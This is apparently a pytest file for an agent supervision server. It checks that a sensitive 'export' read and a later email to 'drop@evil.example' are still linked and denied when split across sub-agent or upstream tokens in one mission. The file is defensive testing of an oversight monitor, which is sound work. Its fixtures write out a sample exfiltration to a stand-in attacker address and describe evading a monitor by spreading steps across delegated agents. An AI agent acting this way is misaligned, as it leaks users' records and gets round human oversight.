"""Composition holds across a delegation chain inside one mission.

AAuth lets a parent agent request tokens for a sub-agent (`subagent_token`) and a
resource act as an agent downstream (`upstream_token`); downstream tokens carry the
upstream `mission_s256` (AAuth Protocol, Document History, -11). The SS keeps history per
mission, so splitting an exfiltration across members of the chain does not hide it: the
sensitive read by one and the external send by another still compose.
"""
from __future__ import annotations

import pytest
from conftest import AGENT, SUB, connected, make_env

from aauth_supervision_server.jwk import b64u
from aauth_supervision_server.testing import r3_bytes

RECORDS = "https://records.example"
MAIL = "https://mail.example"
SUBAGENT = {"subagent_token": "eyJ.subagent.token"}
UPSTREAM = {"upstream_token": "eyJ.upstream.token"}


def _decide(env, s256, resource, proposal, chain):
    ss, ps, clock = env
    raw, digest = r3_bytes(proposal)
    sdi = ps.nid("d")
    body = {"sdi": sdi, "act": "auth_token", "iat": int(clock()), "sub": SUB, "agent": AGENT,
            "mission_s256": s256, "agent_token": ps.agent_token(AGENT),
            "resource_token": ps.resource_token(resource, "", digest, s256),
            "presented_token": "a.b.c", "r3_proposal": b64u(raw), **chain}
    decision = ps.call(ss, "POST", "/decision", body).json()["decision"]
    if decision == "allow":
        assert ps.issued(ss, SUB, AGENT, s256, sdi, resource).status == 201
    return decision


@pytest.mark.parametrize(("read_chain", "send_chain"), [
    ({}, {}), (SUBAGENT, {}), ({}, SUBAGENT), ({}, UPSTREAM), (UPSTREAM, SUBAGENT)])
def test_split_exfiltration_across_the_chain_is_denied(read_chain, send_chain):
    env = make_env(transport="forwarded")
    s256 = connected(env, resources=(RECORDS, MAIL))
    read = {"operations": [{"tool": "export"}], "parameters": {}}
    send = {"operations": [{"tool": "send_email"}], "parameters": {"to": "drop@evil.example"}}
    assert _decide(env, s256, RECORDS, read, read_chain) == "allow"
    assert _decide(env, s256, MAIL, send, send_chain) == "deny"


def test_the_same_send_alone_is_allowed():
    # Control: without the sensitive read earlier in the mission the send is allowed, so
    # the deny above comes from the composition, not from the send.
    env = make_env(transport="forwarded")
    s256 = connected(env, resources=(RECORDS, MAIL))
    send = {"operations": [{"tool": "send_email"}], "parameters": {"to": "drop@evil.example"}}
    assert _decide(env, s256, MAIL, send, SUBAGENT) == "allow"
